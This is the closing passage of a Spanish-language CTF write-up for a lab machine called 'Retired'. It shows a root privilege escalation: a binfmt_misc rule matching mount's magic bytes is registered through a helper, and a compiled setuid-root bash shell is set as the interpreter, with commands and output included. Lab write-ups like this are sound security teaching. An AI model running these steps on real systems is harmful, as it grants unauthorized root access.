<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /usr/bin/mount | xxd -ps | head -n1 | sed 's/\(..\)/\\x\1/g'
\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x40\x62\x00\x00\x00\x00  
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora registramos una nueva regla con el nombre <code class="language-plaintext highlighter-rouge">pwned</code> usando los <code class="language-plaintext highlighter-rouge">magicbytes</code> de <code class="language-plaintext highlighter-rouge">mount</code> ademas de la flag <code class="language-plaintext highlighter-rouge">C</code>, como interprete indicaremos a <code class="language-plaintext highlighter-rouge">/tmp/shell</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ echo ':pwned:M::\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x40\x62\x00\x00\x00\x00::/tmp/shell:C' | /usr/lib/emuemu/reg_helper  
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">La configuración indica que cuando se detecte la ejecucion de un <code class="language-plaintext highlighter-rouge">binario</code>con los <code class="language-plaintext highlighter-rouge">magicbytes</code> de <code class="language-plaintext highlighter-rouge">mount</code> este tomara como interprete el binario <code class="language-plaintext highlighter-rouge">/tmp/shell</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /proc/sys/fs/binfmt_misc/pwned 
enabled
interpreter /tmp/shell
flags: OC
offset 0
magic 7f454c4602010100000000000000000003003e0001000000406200000000  
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora solo falta crear el binario <code class="language-plaintext highlighter-rouge">shell</code>, para ello con un programa en <code class="language-plaintext highlighter-rouge">C</code> creamos un compilado que setee nuestro <code class="language-plaintext highlighter-rouge">uid</code> a <code class="language-plaintext highlighter-rouge">0</code> y nos lanze una <code class="language-plaintext highlighter-rouge">bash</code> interactiva</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ cat shell.c
#include &ltstdlib.h>
#include &ltunistd.h>

int main() {
    setreuid(0, 0);
    setregid(0, 0);
    system("/bin/bash");
    return 0;
}
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ gcc shell.c -o shell  
</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Finalmente ejecutamos el binario <code class="language-plaintext highlighter-rouge">mount</code> y al comparar los <code class="language-plaintext highlighter-rouge">magicbytes</code> y ser iguales este tomara como interprete <code class="language-plaintext highlighter-rouge">shell</code> que nos dara una <code class="language-plaintext highlighter-rouge">bash</code> con el uid <code class="language-plaintext highlighter-rouge">0</code> de <code class="language-plaintext highlighter-rouge">root</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ mount
</span><span class="ve">root@retired</span><span class="p">:</span><span class="az">~</span><span class="p"># id
uid=0(root) gid=0(root) groups=0(root)
</span><span class="ve">root@retired</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
10.10.11.154
</span><span class="ve">root@retired</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /root/root.txt 
3b4**************************00e
</span><span class="ve">root@retired</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - DarthBear</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
